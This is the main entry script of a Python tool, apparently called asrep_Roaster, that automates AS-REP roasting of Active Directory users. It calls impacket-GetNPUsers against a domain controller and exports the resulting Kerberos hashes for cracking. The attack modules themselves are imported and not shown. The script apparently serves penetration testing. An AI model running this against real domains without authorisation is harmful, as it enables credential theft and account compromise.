#!/usr/bin/env python3
from asrep_Roaster import cli, enum, asrep, report

def main():
    args = cli.parse_args()

    print(f"[*] Loading users from {args.users}")
    users = enum.load_users(args.users)

    print(f"[*] Enumerating against {args.domain} ({args.dc_ip}) using impacket-GetNPUsers...")
    asrep.process_users(users, args.domain, args.dc_ip, args.users)

    selected_users = cli.interactive_selection(users)

    print(f"[*] Generating report to {args.output}")
    report.generate_full_report(selected_users, args.output)

    print(f"[*] Exporting hashes to {args.hashes}")
    report.export_hashes(selected_users, args.hashes)

    print("[+] Done.")

if __name__ == "__main__":
    main()
